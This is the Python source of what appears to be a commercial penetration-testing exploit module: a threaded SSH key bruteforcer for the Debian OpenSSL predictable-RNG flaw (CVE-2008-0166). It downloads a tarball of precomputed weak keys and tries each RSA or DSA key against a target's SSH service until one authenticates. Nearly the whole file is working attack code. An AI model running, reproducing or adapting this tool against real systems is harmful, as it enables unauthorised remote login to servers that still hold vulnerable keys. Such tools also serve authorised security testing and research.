#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import os
import getopt
import sys
import socket
import time
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit

NAME='Debian SSH bruteforcer'
DESCRIPTION='Threaded SSH password bruteforcer for Debian RNG predictable numbers vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Debian"
DOCUMENTATION['References']=''
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION["CVE Name"] = "CVE-2008-0166"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166"
DOCUMENTATION['CVSS'] = 7.8
DOCUMENTATION["Notes"]="""
This exploit brute forces all the keys for the Debian OpenSSL/OpenSSH
vulnerability.

"""
DOCUMENTATION["Commandline"]="exploits/tool/debian_ssh_key_brute/debian_ssh_key_brute.py -t 10.10.10.207 -O user:user -O full_close:0"

VERSION='0.1'

PROPERTY={}
PROPERTY['TYPE']='Tools'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Linux']]

NOTES="""
"""

CHANGELOG="""
"""
import libs.paramiko as paramiko
from engine.config import canvas_resources_directory

from threading import *
class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.port=22
        self.filename=os.path.join(canvas_resources_directory,"debian_ssh_keys")
        self.user='Administrator'
        self.mylock=RLock()
        self.threadcount=5
        self.found_pkey=None
        self.full_close=True
        self.connections_failing=False
        self.bits="2048"
        self.keytype="rsa"
        return

    def getArgs(self):
        self.host=self.target.interface
        self.user=self.argsDict.get('user',self.user)
        self.port=self.argsDict.get('port',self.port)
        self.full_close=int(self.getarg("full_close"))
        self.threadcount=int(self.getarg("threadcount"))
        self.bits=self.getarg("bits")
        self.keytype=self.getarg("keytype")
        return

    def getNextKey(self):
        """
        Only one thread at a time can get a key from the files
        """
        while 1:
            #check to see if we are done
            if self.keycount>32765:
                self.no_more_passwords=True
                break

            filename=os.path.join(self.filename,"_".join([self.keytype,str(self.bits),str(self.keycount)]))
            #ex: filename=Resources/rsa_2048_1
            self.log("Filename: %s"%filename)
            if self.keytype=="rsa":
                pkey=paramiko.RSAKey(filename=filename)
            elif self.keytype=="dsa":
                pkey=paramiko.DSSKey(filename=filename)
            try:
                pkey=pkey.from_private_key_file(filename)
            except IOError:
                self.log("Failure trying to read file %s!"%filename)
                pkey=None
            except paramiko.PasswordRequiredException:
                self.log("Password required for %s"%filename)
                pkey=None
            except paramiko.SSHException:
                self.log("File %s is invalid as a private key file"%filename)
                pkey=None

            self.keycount+=1
            if pkey==None:
                continue

            #give the caller back our key.
            yield (pkey, filename)

        return

    def run_in_thread(self):
        """
        Each thread makes connections and tries passwords
        """
        pkey="A"
        #six is default so we do one less
        max_tries_per_connect=5

        no_more_pkeys=False
        while pkey!=None:
            if self.state==self.HALT:
                self.log("Thread halting.")
                return

            if self.done:
                break


            sock=self.gettcpsock()
            try:
                sock.connect((self.host, self.port))
            except socket.error:
                self.log("Failed to connect to %s:%d"%(self.host, self.port))
                self.log("Ending this thread.")
                self.connections_failing=True
                return

            t = paramiko.Transport(sock)
            try:
                t.connect()
            except paramiko.SSHException, msg:
                self.log("%s is not the pkey: %s"%(pkey, msg))
                if "Error reading SSH protocol" in str(msg):
                    self.log("Connection has been overwhelmed (or is not SSH!)")
                    t.close()
                    del t
                    self.log("Thread sleeping to let server recover")
                    #you have to sleep for an ungodly time here.
                    time.sleep(120)
                    continue

            for i in xrange(0,max_tries_per_connect):
                self.mylock.acquire()
                try:
                    (pkey, filename)=self.pkeys.next()
                except StopIteration:
                    no_more_pkeys=True
                self.mylock.release()
                if no_more_pkeys:
                    return

                try:
                    self.log("Trying %s:%s"%(self.user, filename))
                    t.auth_publickey(self.user, pkey)
                    #we got a "Bad auth" message from the server
                except paramiko.SSHException, msg:
                    self.log("SSH Exception: %s"%msg)
                else:
                    self.log("Found pkey: %s"%filename)
                    self.found_pkey=filename
                    self.done=True
                    t.close()

            if self.full_close:
                #this is slow
                t.close()
            else:
                #this is fast but on Ubuntu gives you false negatives
                del t

        return

    def test(self):
        self.getArgs()
        self.log('%s running against %s:%s covertness: %d'%(NAME,self.host,self.port,self.covertness))
        self.setInfo('%s attacking %s:%s (Covertness:%d) - running'%(NAME,self.host,self.port,self.covertness))

    def get_debian_keys(self):
        """

        #This is the post-install work we need to do.
        # 1 check to see if we have a Resources/debian_ssh_keys/ directory
        # 2 if not, create it goto step 4
        # 3 check to see if we have all the key files. If we do, goto step 6
        # 4 create Resources/debian_ssh_keys/download and untar the key files from www.immunityinc.com
        # 5 If the untar failed, exit with an error message
        # 6 continue with exploit


        """
        self.log("Checking to see if we have the debian ssh keys installed")
        self.log("If not, we'll download them now.")

        dirname=os.path.join(canvas_resources_directory,"debian_ssh_keys")
        ssh_flag_name=os.path.join(dirname,"ssh_keys_here")
        have_keys=False
        if os.path.isdir(dirname):
            self.log("Found directory...")
            #if it is a directory, then we also need to check to see if we have the files
            if os.path.isfile(ssh_flag_name):
                self.log("Found flag file")
                have_keys=True
        if have_keys:
            return True

        #if we got here we do not have the keys, we need to download them from the server
        try:
            self.log("Creating directory")
            ret=os.mkdir(dirname)
        except OSError:
            if os.path.isdir(dirname):
                self.log("%s already exists"%dirname)
            else:
                self.log("Cannot make directory %s!"%dirname)
                #failed
                return False

        #directory is made, now need to download tarball into it
        output_filename=os.path.join(dirname,"debian_ssh_keys.tbz2")
        import urllib
        try:
            self.log("Retrieving file from Immunity web server - this may take a while as file is quite large")
            ret=urllib.urlretrieve("http://downloads.immunityinc.com/debian_ssh_keys.tbz2",filename=output_filename)
        except:
            self.log("Failed to download file")
            return False


        #md5sum check here prevents people from MITM attacking the extractall() call below
        # proper_md5sum="efd9065ee310f122a54f11078a1cb0b5"
        proper_md5sum = "9388ffcfcdbc3fbea72ea56214611f20"
        self.log("MD5summing file")
        sum = md5sum_file(output_filename)
        if sum != proper_md5sum:
            self.log("File did not download correctly!")
            return False

        #unbzip2 the file into its current directory
        import tarfile
        our_tarfile=tarfile.open(output_filename,mode="r:bz2")
        try:
            our_tarfile.extractall(dirname)
        except:
            self.log("Could not extract out the data!")
            return False

        self.log("Got and extracted data successfully - now setting flag so we don't need to do this again")
        file(ssh_flag_name,"w").write("1")
        return True

    def run(self):
        self.getArgs()
        self.no_more_pkeys=False
        self.done=False
        self.log('%s running against %s:%d covertness: %d'%(NAME,self.host,self.port,self.covertness))
        self.setInfo('%s attacking %s:%d (Covertness:%d) - running'%(NAME,self.host,self.port,self.covertness))

        if not self.get_debian_keys():
            self.log("Did not get debian keys downloaded/installed")
            self.log("Cannot run brute force attacker")
            self.setInfo("%s - failed, no debian keys"%self.name)
            return 0


        self.log("Brute forcing user: %s with pkeys"%(self.user))
        self.keycount = 1
        self.pkeys = self.getNextKey()
        if self.full_close:
            self.log("Using slow close method")
        else:
            self.log("Using fast but less accurate close method")
        self.log("Spawning %d threads..."%self.threadcount)
        for i in xrange(self.threadcount):
            r=Thread(target=self.run_in_thread)
            #r.isDaemon()
            r.start()

        self.log("Spawned %d threads"%self.threadcount)
        while self.no_more_pkeys!=True and self.found_pkey==None:
            self.log("Waiting for threads to finish")
            time.sleep(5)
        self.log("Closing open sockets")
        time.sleep(10)
        if self.found_pkey!=None:
            self.log("Found working pkey: %s"%self.found_pkey)
            self.setInfo('%s attacking %s:%d (Covertness:%d) - done (found:%s:%s)'%(NAME,self.host,self.port,self.covertness,self.user,self.found_pkey))
            return 1
        self.log("Did not find the pkey")
        self.setInfo('%s attacking %s:%d (Covertness:%d) - done (failed)'%(NAME,self.host,self.port,self.covertness))
        return 0

    def usage(self):
        print 'Usage: %s -t host -p port -O user:username [-O filename:/usr/share/dict/cracklib-small] -O threadcount:5 -O full_close:0 [-C covertness]'%(sys.argv[0])

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
